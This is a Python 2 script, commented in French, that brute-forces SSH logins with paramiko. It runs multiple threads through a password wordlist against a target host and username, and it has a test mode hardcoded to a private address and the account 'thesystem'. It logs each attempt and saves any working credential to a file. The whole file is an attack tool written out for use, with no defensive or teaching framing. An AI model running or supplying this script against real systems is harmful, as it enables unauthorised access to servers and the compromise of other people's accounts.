#! /usr/bin/python
# -*- coding:utf-8 -*-
import paramiko, sys, os, socket, time
from threading import Thread, current_thread

global host, username, line, input_file, connection_fail_mdp

threads_alive = {} # dico contenant les thread
enough_threads = False
connection_fail_mdp = []
paramiko.util.log_to_file('ssh_brute.log')
line = "\n..........................................\n"

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password)
        print("%s [*] User : %s [*] Pass Found : %s%s" % (line, username, password, line))
        password_file = open("good_password.txt", "w")
        password_file.write(username + password)
        password_file.close()
    except paramiko.AuthenticationException:
        #[*] Authentication Failed...
        print("[*] User : %s [*] Pass : %s => Login Incorrect !" % (username, password))
    except:
        #[*] Connection Failed... Host Down
        print('[*] Connection Could Not Be Established To Address : %s' % (host))
        connection_fail_mdp.append(password)
    finally:
        ssh.close()
        del threads_alive[current_thread().getName()]

print('mode test ? y/n')
auto = raw_input()

if auto == 'n' or auto == 'N':
    try:
        host = raw_input("[*] Enter Target Host Address : ")
        port = input("[*] Enter Port Number : ")
        username = raw_input("[*] Enter SSH Username : ")
        word_list = raw_input("[*] Enter SSH Password File : ")

        if os.path.exists(word_list) == False:
            print('\n[*] File Path Does Not Exist !')
            sys.exit(4)
    except KeyboardInterrupt:
        print("\n\n[*] User Request An Interrupt.")
        sys.exit(3)
else:
    host = '192.168.1.220'
    port = 22
    username = 'thesystem'
    word_list = '../web2.txt'

thread_number = input("[*] Enter Thread Number Limit : (Default : 10)")
if thread_number == '':
    thread_number = 10

word_list = open(word_list)
print('')

for i in word_list.readlines():
    password = i.strip("\n")
    while enough_threads: # si il y a - de x threads en route on arrete la pause
        if len(threads_alive) < thread_number:
            enough_threads = False
    try:
        t = Thread(target = ssh_connect, args = (password, 0))
        threads_alive[t.getName()] = t
        t.start()
    except KeyboardInterrupt:
        print("\n\n[*] User Request An Interrupt.")
        sys.exit(3)
    except Exception as e:
        print(e)
        pass
    finally:
        if len(threads_alive) >= thread_number: # Si il y a x threads ou plus en cours on fait une pause
            enough_threads = True

input_file.close()
sys.exit(3)